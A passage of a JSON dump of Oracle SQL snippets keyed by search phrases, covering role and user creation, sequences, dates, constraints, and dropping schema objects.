    "description": "-- CREATE ROLE role_name [IDENTIFIED BY password] [NOT IDENTIFIED] CREATE ROLE role_name; GRANT CREATE SESSION, ALTER SESSION TO role_name; GRANT SELECT, INSERT, DELETE, UPDATE ON table_name TO role_name; GRANT EXECUTE ON proc_name TO role_name; -- Grant role to user GRANT role_name TO user_name; ALTER USER user_name DEFAULT ROLE role_name; SELECT * FROM DBA_ROLES WHERE ROLE = 'role_name'; SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'role_name'  \tAND GRANTEE = 'user_name';\n",
    "reg_date": "2021-10-12T09:58:10.000Z"
  },
  {
    "id": 2707,
    "keyword": null,
    "link": null,
    "title": " oracle create role privilege",
    "description": "-- CREATE ROLE role_name [IDENTIFIED BY password] [NOT IDENTIFIED] CREATE ROLE role_name; GRANT CREATE SESSION, ALTER SESSION TO role_name; GRANT SELECT, INSERT, DELETE, UPDATE ON table_name TO role_name; GRANT EXECUTE ON proc_name TO role_name; -- Grant role to user GRANT role_name TO user_name; ALTER USER user_name DEFAULT ROLE role_name; SELECT * FROM DBA_ROLES WHERE ROLE = 'role_name'; SELECT * FROM DBA_ROLE_PRIVS WHERE GRANTED_ROLE = 'role_name'  \tAND GRANTEE = 'user_name';\n",
    "reg_date": "2021-10-12T09:58:10.000Z"
  },
  {
    "id": 2708,
    "keyword": null,
    "link": null,
    "title": " oracle create schema",
    "description": "-- Oracle - User / schema creation CREATE USER MY_USER IDENTIFIED BY \"MyPassword\" DEFAULT TABLESPACE USERS TEMPORARY TABLESPACE TEMP PROFILE DEFAULT ACCOUNT UNLOCK; GRANT CONNECT TO MY_USER;           -- To connect to DB GRANT RESOURCE TO MY_USER;          -- Access / modify GRANT MY_ROLE TO MY_USER;           -- Grants a role (to be defined) ALTER USER MY_USER DEFAULT ROLE \"RESOURCE\",\"CONNECT\",\"MY_ROLE\"; -- Proxy access ALTER USER MY_USER GRANT CONNECT THROUGH MY_OTHER_USER; -- Checks privileges: SELECT PRIVILEGE FROM DBA_SYS_PRIVS WHERE GRANTEE = MY_USER;\n-- 1st Step CREATE USER user_name IDENTIFIED BY password; -- 2nd step GRANT RESOURCE TO user_name; GRANT CONNECT TO user_name; GRANT CREATE VIEW TO user_name; GRANT CREATE SESSION TO user_name; GRANT UNLIMITED TABLESPACE TO user_name; \nGRANT CREATE TABLE TO smith;\n",
    "reg_date": "2021-10-12T09:58:10.000Z"
  },
  {
    "id": 2709,
    "keyword": null,
    "link": null,
    "title": " oracle create sequence",
    "description": "CREATE SEQUENCE schema.seq_name  \tMINVALUE 1      INCREMENT BY 1      START WITH 1      CACHE 1000      ORDER; GRANT SELECT ON schema.seq_name TO user_name;\n",
    "reg_date": "2021-10-12T09:58:10.000Z"
  },
  {
    "id": 2710,
    "keyword": null,
    "link": null,
    "title": " oracle create stored procedure",
    "description": "-- Oracle  -- EXAMPLE CREATE OR REPLACE PROCEDURE select_employees() BEGIN    select *     from employees     limit 1000; -- Remember, the delimiters within the stored procedure remain ; END;  /* SYNTAX CREATE OR REPLACE PROCEDURE <Your-procedure-name>(<argument1><argument2>...<argumentN>) BEGIN    <Code-that-stored-procedure-executes>; -- Remember, the delimiters within the stored procedure remain ; END; */\n",
    "reg_date": "2021-10-12T09:58:10.000Z"
  },
  {
    "id": 2711,
    "keyword": null,
    "link": null,
    "title": " oracle create synonym",
    "description": "-- Can be a table, package, procedure... CREATE OR REPLACE SYNONYM syn_name FOR my_schema.my_table;       CREATE OR REPLACE PUBLIC SYNONYM syn_name FOR my_schema.my_table;  -- Through a dblink: CREATE OR REPLACE SYNONYM syn_name FOR my_schema.my_table@my_dblink;\nCREATE OR REPLACE PUBLIC SYNONYM suppliers FOR app.suppliers;\n",
    "reg_date": "2021-10-12T09:58:10.000Z"
  },
  {
    "id": 2712,
    "keyword": null,
    "link": null,
    "title": " oracle create table auto generated primary key",
    "description": "-- For oracle 12c or later  -- auto inc create table t1 (     c1 NUMBER GENERATED by default on null as IDENTITY,     c2 VARCHAR2(10)     ); -- More options for initial value and increment value create table t1 (     c1 NUMBER GENERATED ALWAYS as IDENTITY(START with 1 INCREMENT by 1),     c2 VARCHAR2(10)     );\n",
    "reg_date": "2021-10-12T09:58:10.000Z"
  },
  {
    "id": 2713,
    "keyword": null,
    "link": null,
    "title": " oracle create table comment",
    "description": "COMMENT ON TABLE table_name IS 'A table comment'; COMMENT ON COLUMN table_name.MY_COLUMN IS 'A column comment';  SELECT * FROM ALL_TAB_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME'; SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'TABLE_NAME';\nSELECT * FROM ALL_TAB_COMMENTS WHERE TABLE_NAME = 'MY_TABLE';  -- Table comment SELECT * FROM ALL_COL_COMMENTS WHERE TABLE_NAME = 'MY_TABLE';  -- Columns comments  -- All owner tables: SELECT t.OWNER, t.TABLE_NAME, com.COMMENTS FROM DBA_TABLES t LEFT JOIN DBA_TAB_COMMENTS com ON com.OWNER = t.OWNER AND com.TABLE_NAME = t.TABLE_NAME WHERE t.OWNER = 'TRANSFERT_DOAAT' AND t.DROPPED = 'NO' ORDER BY t.OWNER, t.TABLE_NAME;\n",
    "reg_date": "2021-10-12T09:58:11.000Z"
  },
  {
    "id": 2714,
    "keyword": null,
    "link": null,
    "title": " oracle create table if not exists",
    "description": "CREATE TABLE IF NOT EXISTS  > CREATE TABLE IF NOT EXISTS TEAMS > (TEAMNO      INTEGER NOT NULL PRIMARY KEY, > EmployeeNO    INTEGER NOT NULL, > DIVISION    CHAR(6) NOT NULL); \nDECLARE\t\t\t\t\t\t\t\t-- Oracle     existing_table number;\t\t\t BEGIN     SELECT count(*) into existing_table FROM ALL_TABLES     WHERE TABLE_NAME = 'table_name' AND OWNER = 'owner';     IF existing_table = 1 then         EXECUTE IMMEDIATE 'DROP TABLE owner.table_name';     END IF; END; / CREATE TABLE owner.table_name (BDAY DATE, [...]); \n",
    "reg_date": "2021-10-12T09:58:11.000Z"
  },
  {
    "id": 2715,
    "keyword": null,
    "link": null,
    "title": " oracle create table primary key",
    "description": "-- Adding Using alter ALTER TABLE table_name ADD CONSTRAINT constraint_name PRIMARY KEY (column1, column2, ... column_n);\n-- Primary key in a table SELECT * FROM ALL_CONSTRAINTS \t\t-- or DBA_CONSTRAINTS or UESR_CONSTRAINTS WHERE TABLE_NAME= 'table_name' AND CONSTRAINT_TYPE = 'P'; -- With columns names: SELECT c.OWNER, c.TABLE_NAME, c.CONSTRAINT_NAME, c.CONSTRAINT_TYPE,  \tcol.COLUMN_NAME FROM ALL_CONSTRAINTS c JOIN ALL_CONS_COLUMNS col ON c.TABLE_NAME = col.TABLE_NAME      AND c.CONSTRAINT_NAME = col.CONSTRAINT_NAME WHERE c.TABLE_NAME= 'table_name' AND c.CONSTRAINT_TYPE = 'P' ORDER BY c.TABLE_NAME, c.CONSTRAINT_NAME, col.COLUMN_NAME;\n-- Dropping Using alter ALTER TABLE table_name DROP CONSTRAINT constraint_name;\n-- syntax: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = '<table-name>' -- Replace <table-name> with your table-name AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner   -- example: SELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'CUSTOMERS'  AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner \nCREATE TABLE table_name (   column1 datatype null/not null,   column2 datatype null/not null,   ...   CONSTRAINT constraint_name PRIMARY KEY (column1, column2, ... column_n) );\n",
    "reg_date": "2021-10-12T09:58:11.000Z"
  },
  {
    "id": 2716,
    "keyword": null,
    "link": null,
    "title": " oracle current date",
    "description": "-- In SESSION time zone SELECT current_timestamp FROM dual;     -- 2021-05-07 05:36:57.476000 SELECT current_timestamp(2) FROM dual;  -- 2021-05-07 05:36:57.470000 SELECT current_date FROM dual;          -- 2021-05-07 05:36:57 -- In SYSTEM on which database resides SELECT systimestamp FROM dual;          -- 2021-05-07 07:36:57.762000 +02:00 SELECT sysdate FROM dual;               -- 2021-05-07 07:36:57\n",
    "reg_date": "2021-10-12T09:58:11.000Z"
  },
  {
    "id": 2717,
    "keyword": null,
    "link": null,
    "title": " oracle current date minus 1 day",
    "description": "SELECT sysdate - 1 FROM dual; \t\t\t\t-- Yesterday    12/01/2021 14:27:27 SELECT trunc(sysdate) - 1 FROM dual; \t\t-- Yesterday    12/01/2021 00:00:00 SELECT sysdate - 1 / 24 FROM dual;\t\t\t\t\t-- 1 hour ago SELECT sysdate - 1 / 24 / 60 FROM dual;\t\t\t\t-- 1 minute ago SELECT add_months(trunc(sysdate), -1) FROM dual;   \t-- 1 month ago (no time) SELECT trunc(sysdate) - 30 FROM dual;\t\t\t\t-- 30 days ago (no time) SELECT add_months(trunc(sysdate), -12*2) FROM dual;\t-- 2 years ago (no time)\n",
    "reg_date": "2021-10-12T09:58:11.000Z"
  },
  {
    "id": 2718,
    "keyword": null,
    "link": null,
    "title": " oracle current date plus 1 month",
    "description": "SELECT sysdate + 1 FROM dual; \t\t\t\t-- Tomorrow    12/01/2021 14:27:27 SELECT trunc(sysdate) + 1 FROM dual; \t\t-- Tomorrow    12/01/2021 00:00:00 SELECT sysdate + INTERVAL '20' DAY FROM DUAL;\t\t-- 20 days ahead (other way) SELECT sysdate + 1 / 24 FROM dual;\t\t\t\t\t-- 1 hour ahead SELECT sysdate + 1 / 24 / 60 FROM dual;\t\t\t\t-- 1 minute ahead SELECT add_months(trunc(sysdate), 1) FROM dual;   \t-- 1 month ahead (no time) SELECT trunc(sysdate) + 30 FROM dual;\t\t\t\t-- 30 days ahead (no time) SELECT add_months(trunc(sysdate), +12*2) FROM dual;\t-- 2 years ahead (no time)\n",
    "reg_date": "2021-10-12T09:58:11.000Z"
  },
  {
    "id": 2719,
    "keyword": null,
    "link": null,
    "title": " oracle current date without time",
    "description": "SELECT trunc(sysdate) FROM dual;\t\t-- returns a DATE  01/12/2021 00:00:00 SELECT to_char(sysdate, 'DD/MM/YYYY') FROM dual; -- returns a string '01/12/2021'\n",
    "reg_date": "2021-10-12T09:58:12.000Z"
  },
  {
    "id": 2720,
    "keyword": null,
    "link": null,
    "title": " oracle current sequence value",
    "description": "SELECT LAST_NUMBER FROM ALL_SEQUENCES WHERE SEQUENCE_NAME = 'seq_name';\n",
    "reg_date": "2021-10-12T09:58:12.000Z"
  },
  {
    "id": 2721,
    "keyword": null,
    "link": null,
    "title": " oracle current session details",
    "description": "SELECT sys_context('USERENV', 'SID') FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:12.000Z"
  },
  {
    "id": 2722,
    "keyword": null,
    "link": null,
    "title": " oracle current timestamp",
    "description": "-- In SESSION time zone SELECT current_timestamp FROM dual;     -- 2021-05-07 05:36:57.476000 SELECT current_timestamp(2) FROM dual;  -- 2021-05-07 05:36:57.470000 SELECT current_date FROM dual;          -- 2021-05-07 05:36:57 -- In SYSTEM on which database resides SELECT systimestamp FROM dual;          -- 2021-05-07 07:36:57.762000 +02:00 SELECT sysdate FROM dual;               -- 2021-05-07 07:36:57\n",
    "reg_date": "2021-10-12T09:58:12.000Z"
  },
  {
    "id": 2723,
    "keyword": null,
    "link": null,
    "title": " oracle current timestamp insert statement",
    "description": "--if you want to hardcode the time stamp:   insert into tablename (timestamp_value) values (TO_TIMESTAMP(:ts_val, 'YYYY-MM-DD HH24:MI:SS'));  --if you want the current time stamp to be inserted then:  insert into tablename (timestamp_value) values (CURRENT_TIMESTAMP);\n",
    "reg_date": "2021-10-12T09:58:12.000Z"
  },
  {
    "id": 2724,
    "keyword": null,
    "link": null,
    "title": " oracle cursor count",
    "description": "-- open the cursor and then fetch and count every row DECLARE     CURSOR c IS SELECT * FROM emp;     cursor_count c%ROWTYPE;     totalrows    NUMBER; BEGIN     OPEN c;     LOOP         FETCH c INTO cursor_count;         dbms_output.put_line('names' || cursor_count.ename);         EXIT WHEN c%NOTFOUND;         END LOOP;     totalrows := c%ROWCOUNT;     dbms_output.put_line('total rows' || totalrows); END;\n",
    "reg_date": "2021-10-12T09:58:12.000Z"
  },
  {
    "id": 2725,
    "keyword": null,
    "link": null,
    "title": " oracle cursor for loop fetch",
    "description": "-- open the cursor and then fetch and count every row DECLARE     CURSOR c IS SELECT * FROM emp;     cursor_count c%ROWTYPE;     totalrows    NUMBER; BEGIN     OPEN c;     LOOP         FETCH c INTO cursor_count;         dbms_output.put_line('names' || cursor_count.ename);         EXIT WHEN c%NOTFOUND;         END LOOP;     totalrows := c%ROWCOUNT;     dbms_output.put_line('total rows' || totalrows); END;\n",
    "reg_date": "2021-10-12T09:58:12.000Z"
  },
  {
    "id": 2726,
    "keyword": null,
    "link": null,
    "title": " oracle cursor rowcount",
    "description": "-- open the cursor and then fetch and count every row DECLARE     CURSOR c IS SELECT * FROM emp;     cursor_count c%ROWTYPE;     totalrows    NUMBER; BEGIN     OPEN c;     LOOP         FETCH c INTO cursor_count;         dbms_output.put_line('names' || cursor_count.ename);         EXIT WHEN c%NOTFOUND;         END LOOP;     totalrows := c%ROWCOUNT;     dbms_output.put_line('total rows' || totalrows); END;\n",
    "reg_date": "2021-10-12T09:58:12.000Z"
  },
  {
    "id": 2727,
    "keyword": null,
    "link": null,
    "title": " oracle db create new schema",
    "description": "-- 1st Step CREATE USER user_name IDENTIFIED BY password; -- 2nd step GRANT RESOURCE TO user_name; GRANT CONNECT TO user_name; GRANT CREATE VIEW TO user_name; GRANT CREATE SESSION TO user_name; GRANT UNLIMITED TABLESPACE TO user_name; \nCREATE USER smith IDENTIFIED BY password;\nGRANT CREATE TABLE TO smith;\n",
    "reg_date": "2021-10-12T09:58:12.000Z"
  },
  {
    "id": 2728,
    "keyword": null,
    "link": null,
    "title": " oracle db get table sizes",
    "description": "select segment_name, sum(bytes)/1024 KB  from user_segments  where segment_type='TABLE' and segment_name in (SELECT TABLE_NAME FROM ALL_TABLES)  group by segment_name order by KB desc; \n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2729,
    "keyword": null,
    "link": null,
    "title": " oracle db timestamp auto add",
    "description": "ALTER TABLE table MODIFY time_collumn TIMESTAMP DEFAULT CURRENT_TIMESTAMP;\n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2730,
    "keyword": null,
    "link": null,
    "title": " oracle db version query",
    "description": "SELECT * FROM v$version;\n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2731,
    "keyword": null,
    "link": null,
    "title": " oracle dba dependencies",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2732,
    "keyword": null,
    "link": null,
    "title": " oracle dblink index",
    "description": "SELECT  /*+ DRIVING_SITE(table_name) */ *     FROM table_name@dblink_name t     WHERE t.REGISTER_DATE = trunc(sysdate);\n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2733,
    "keyword": null,
    "link": null,
    "title": " oracle ddl",
    "description": "-- 4000 characters max SELECT dbms_metadata.get_ddl('PROCOBJ', 'job_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('PROCOBJ', 'program_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('TABLE', 'table_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('VIEW', 'view_name', 'owner') FROM DUAL;  SELECT dbms_metadata.get_ddl('PACKAGE', 'pkg_name', 'owner') FROM DUAL;  SELECT dbms_metadata.get_ddl('PROCEDURE', 'proc_name', 'owner') FROM DUAL;   SELECT dbms_metadata.get_ddl('INDEX', 'index_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('TYPE', 'type_name', 'owner') FROM DUAL;\n-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'VIEW_NAME', 'OWNER_NAME') FROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2734,
    "keyword": null,
    "link": null,
    "title": " oracle default date format",
    "description": "ALTER SESSION SET NLS_DATE_FORMAT = 'DD-MM-YYYY HH24:MI:SS'; SELECT sysdate FROM dual;  SELECT to_char(sysdate,'HH24:MI:SS') FROM dual;\nSELECT   TO_DATE( '24-JUL-21', 'DD-MON-RR' ) FROM   dual;\n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2735,
    "keyword": null,
    "link": null,
    "title": " oracle delete last row",
    "description": "DELETE FROM my_table WHERE my_col_id = (SELECT MAX(my_col_id) FROM my_table);\n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2736,
    "keyword": null,
    "link": null,
    "title": " oracle delete schema objects",
    "description": "BEGIN     FOR cur_rec IN (SELECT OBJECT_NAME, OBJECT_TYPE                     FROM ALL_OBJECTS\t\t-- Choose types                     WHERE OBJECT_TYPE IN ('TABLE', 'VIEW', 'PACKAGE',                                           'PROCEDURE', 'FUNCTION', 'SEQUENCE'))                           AND OWNER = 'owner_name'         LOOP             BEGIN                 IF cur_rec.OBJECT_TYPE = 'TABLE'                 THEN                     EXECUTE IMMEDIATE 'DROP ' || cur_rec.OBJECT_TYPE || ' \"'                         || cur_rec.OBJECT_NAME || '\" CASCADE CONSTRAINTS';                 ELSE                     EXECUTE IMMEDIATE 'DROP ' || cur_rec.OBJECT_TYPE || ' \"'                         || cur_rec.OBJECT_NAME || '\"';                 END IF;             EXCEPTION                 WHEN OTHERS                     THEN                         DBMS_OUTPUT.PUT_LINE('FAILED: DROP '                             || cur_rec.OBJECT_TYPE || ' \"'                             || cur_rec.OBJECT_NAME || '\"');             END;         END LOOP; END;\n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2737,
    "keyword": null,
    "link": null,
    "title": " oracle dependencies table",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2738,
    "keyword": null,
    "link": null,
    "title": " oracle dependency",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T09:58:13.000Z"
  },
  {
    "id": 2739,
    "keyword": null,
    "link": null,
    "title": " oracle desc table primary key",
    "description": "-- Primary key in a table SELECT * FROM ALL_CONSTRAINTS \t\t-- or DBA_CONSTRAINTS or UESR_CONSTRAINTS WHERE TABLE_NAME= 'table_name' AND CONSTRAINT_TYPE = 'P'; -- With columns names: SELECT c.OWNER, c.TABLE_NAME, c.CONSTRAINT_NAME, c.CONSTRAINT_TYPE,  \tcol.COLUMN_NAME FROM ALL_CONSTRAINTS c JOIN ALL_CONS_COLUMNS col ON c.TABLE_NAME = col.TABLE_NAME      AND c.CONSTRAINT_NAME = col.CONSTRAINT_NAME WHERE c.TABLE_NAME= 'table_name' AND c.CONSTRAINT_TYPE = 'P' ORDER BY c.TABLE_NAME, c.CONSTRAINT_NAME, col.COLUMN_NAME;\nSELECT cols.table_name, cols.column_name, cols.position, cons.status, cons.owner FROM all_constraints cons, all_cons_columns cols WHERE cols.table_name = 'TABLE_NAME' AND cons.constraint_type = 'P' AND cons.constraint_name = cols.constraint_name AND cons.owner = cols.owner ORDER BY cols.table_name, cols.position;\n",
    "reg_date": "2021-10-12T09:58:14.000Z"
  },
  {
    "id": 2740,
    "keyword": null,
    "link": null,
    "title": " oracle difference between two dates in seconds",
    "description": "SELECT (END_DT - START_DT) * 60 * 60 * 24 FROM MY_TABLE;   \t-- Seconds SELECT (END_DT - START_DT) * 60 * 24 FROM MY_TABLE;   \t\t-- Minutes SELECT (END_DT - START_DT) * 24 FROM MY_TABLE;   \t\t\t-- Hours\nselect floor(months_between(date '2012-10-10', date '2011-10-10') /12) from dual;  select floor(months_between(date '2012-10-9' , date '2011-10-10') /12) from dual; \n  v_numvar := dt1-dt2;\n",
    "reg_date": "2021-10-12T09:58:14.000Z"
  },
  {
    "id": 2741,
    "keyword": null,
    "link": null,
    "title": " oracle difference between two dates in years",
    "description": "select floor(months_between(date '2012-10-10', date '2011-10-10') /12) from dual;  select floor(months_between(date '2012-10-9' , date '2011-10-10') /12) from dual; \n",
    "reg_date": "2021-10-12T09:58:14.000Z"
  },
  {
    "id": 2742,
    "keyword": null,
    "link": null,
    "title": " oracle driving site",
    "description": "SELECT  /*+ DRIVING_SITE(table_name) */ *     FROM table_name@dblink_name t     WHERE t.REGISTER_DATE = trunc(sysdate);\n",
    "reg_date": "2021-10-12T09:58:14.000Z"
  },
  {
    "id": 2743,
    "keyword": null,
    "link": null,
    "title": " oracle drop all schema tables",
    "description": "BEGIN     FOR cur_rec IN (SELECT OBJECT_NAME, OBJECT_TYPE                     FROM ALL_OBJECTS\t\t-- Choose types                     WHERE OBJECT_TYPE IN ('TABLE', 'VIEW', 'PACKAGE',                                           'PROCEDURE', 'FUNCTION', 'SEQUENCE'))                           AND OWNER = 'owner_name'         LOOP             BEGIN                 IF cur_rec.OBJECT_TYPE = 'TABLE'                 THEN                     EXECUTE IMMEDIATE 'DROP ' || cur_rec.OBJECT_TYPE || ' \"'                         || cur_rec.OBJECT_NAME || '\" CASCADE CONSTRAINTS';                 ELSE                     EXECUTE IMMEDIATE 'DROP ' || cur_rec.OBJECT_TYPE || ' \"'                         || cur_rec.OBJECT_NAME || '\"';                 END IF;             EXCEPTION                 WHEN OTHERS                     THEN                         DBMS_OUTPUT.PUT_LINE('FAILED: DROP '                             || cur_rec.OBJECT_TYPE || ' \"'                             || cur_rec.OBJECT_NAME || '\"');             END;         END LOOP; END;\n",
    "reg_date": "2021-10-12T09:58:14.000Z"
  },
  {
    "id": 2744,
    "keyword": null,
    "link": null,
    "title": " oracle drop all user views",
    "description": "-- Specify CASCADE to drop all objects in the user's schema before dropping user. DROP USER MY_USER CASCADE;\nBEGIN     FOR cur_rec IN (SELECT OBJECT_NAME, OBJECT_TYPE                     FROM ALL_OBJECTS\t\t-- Choose types                     WHERE OBJECT_TYPE IN ('TABLE', 'VIEW', 'PACKAGE',                                           'PROCEDURE', 'FUNCTION', 'SEQUENCE'))                           AND OWNER = 'owner_name'         LOOP             BEGIN                 IF cur_rec.OBJECT_TYPE = 'TABLE'                 THEN                     EXECUTE IMMEDIATE 'DROP ' || cur_rec.OBJECT_TYPE || ' \"'                         || cur_rec.OBJECT_NAME || '\" CASCADE CONSTRAINTS';                 ELSE                     EXECUTE IMMEDIATE 'DROP ' || cur_rec.OBJECT_TYPE || ' \"'                         || cur_rec.OBJECT_NAME || '\"';                 END IF;             EXCEPTION                 WHEN OTHERS                     THEN                         DBMS_OUTPUT.PUT_LINE('FAILED: DROP '                             || cur_rec.OBJECT_TYPE || ' \"'                             || cur_rec.OBJECT_NAME || '\"');             END;         END LOOP; END;\n",
    "reg_date": "2021-10-12T09:58:14.000Z"
  },
  {
    "id": 2745,
    "keyword": null,
    "link": null,
    "title": " oracle drop chain step",
    "description": "BEGIN     DBMS_SCHEDULER.DROP_CHAIN_STEP(             CHAIN_NAME => 'chain_name',             STEP_NAME => 'step_name'         ); END;\nBEGIN   DBMS_SCHEDULER.DROP_CHAIN (chain_name => 'my_chain1', force => TRUE); END;\n",
    "reg_date": "2021-10-12T09:58:14.000Z"
  },
  {
    "id": 2746,
    "keyword": null,
    "link": null,
    "title": " oracle drop column",
    "description": "ALTER TABLE table_name DROP COLUMN column_name;\nALTER TABLE my_table DROP COLUMN my_col; -- To check if column exists before renaming it: DECLARE     l_cnt INTEGER; BEGIN     SELECT count(*) INTO l_cnt     FROM dba_tab_columns\t\t-- or all_tab_columns (depending on grants)     WHERE owner = 'my_schema' AND table_name = 'my_table'      \tAND column_name = 'my_col';     IF (l_cnt = 1) THEN         EXECUTE IMMEDIATE 'ALTER TABLE my_schema.my_table DROP COLUMN my_col';     END IF; END;\nalter table table_name drop column column_name; alter table table_name drop (column_name1, column_name2);\n",
    "reg_date": "2021-10-12T09:58:14.000Z"
  },
  {
    "id": 2747,
    "keyword": null,
    "link": null,
    "title": " oracle drop constraint",
    "description": "ALTER TABLE employee DROP CONSTRAINT uniqueEmployeeId;\n",
    "reg_date": "2021-10-12T09:58:14.000Z"
  },
  {
    "id": 2748,
    "keyword": null,
    "link": null,
    "title": " oracle drop index if exists",
    "description": "DECLARE    index_not_exists EXCEPTION;    PRAGMA EXCEPTION_INIT (index_not_exists, -1418); BEGIN    EXECUTE IMMEDIATE 'DROP INDEX index_name'; EXCEPTION    WHEN index_not_exists THEN NULL; END;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2749,
    "keyword": null,
    "link": null,
    "title": " oracle drop job",
    "description": "BEGIN   dbms_scheduler.drop_job(job_name => 'MY_JOB'); END;\nDECLARE     l_job_exists NUMBER; BEGIN     SELECT count(*) INTO l_job_exists FROM ALL_SCHEDULER_JOBS     WHERE JOB_NAME = 'job_name' AND OWNER = 'owner_name';     IF l_job_exists = 1 THEN         dbms_scheduler.drop_job(job_name => 'STATISTICS_COLUMNS_JOB');     END IF; END;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2750,
    "keyword": null,
    "link": null,
    "title": " oracle drop partition",
    "description": "ALTER TABLE table_name DROP PARTITION part_name;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2751,
    "keyword": null,
    "link": null,
    "title": " oracle drop rules",
    "description": "BEGIN     DBMS_RULE_ADM.DROP_RULE('rule_name', TRUE); END;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2752,
    "keyword": null,
    "link": null,
    "title": " oracle drop schema procedures",
    "description": "BEGIN     FOR cur_rec IN (SELECT OBJECT_NAME, OBJECT_TYPE                     FROM ALL_OBJECTS\t\t-- Choose types                     WHERE OBJECT_TYPE IN ('TABLE', 'VIEW', 'PACKAGE',                                           'PROCEDURE', 'FUNCTION', 'SEQUENCE'))                           AND OWNER = 'owner_name'         LOOP             BEGIN                 IF cur_rec.OBJECT_TYPE = 'TABLE'                 THEN                     EXECUTE IMMEDIATE 'DROP ' || cur_rec.OBJECT_TYPE || ' \"'                         || cur_rec.OBJECT_NAME || '\" CASCADE CONSTRAINTS';                 ELSE                     EXECUTE IMMEDIATE 'DROP ' || cur_rec.OBJECT_TYPE || ' \"'                         || cur_rec.OBJECT_NAME || '\"';                 END IF;             EXCEPTION                 WHEN OTHERS                     THEN                         DBMS_OUTPUT.PUT_LINE('FAILED: DROP '                             || cur_rec.OBJECT_TYPE || ' \"'                             || cur_rec.OBJECT_NAME || '\"');             END;         END LOOP; END;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2753,
    "keyword": null,
    "link": null,
    "title": " oracle drop sequence ",
    "description": "DROP SEQUENCE sequence_name;\nDECLARE     s_exist NUMBER(1); BEGIN     SELECT CASE WHEN exists(SELECT * FROM ALL_SEQUENCES                             WHERE SEQUENCE_NAME = 'seq_name') THEN 1        \tELSE 0      END INTO s_exist FROM DUAL;     IF s_exist = 1 THEN         EXECUTE IMMEDIATE 'DROP SEQUENCE seq_name';     END IF; END;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2754,
    "keyword": null,
    "link": null,
    "title": " oracle drop sequence if exists",
    "description": "DECLARE     s_exist NUMBER(1); BEGIN     SELECT CASE WHEN exists(SELECT * FROM ALL_SEQUENCES                             WHERE SEQUENCE_NAME = 'seq_name') THEN 1        \tELSE 0      END INTO s_exist FROM DUAL;     IF s_exist = 1 THEN         EXECUTE IMMEDIATE 'DROP SEQUENCE seq_name';     END IF; END;\n",
    "reg_date": "2021-10-12T09:58:15.000Z"
  },
  {
    "id": 2755,
    "keyword": null,
    "link": null,
    "title": " oracle drop temporary table",
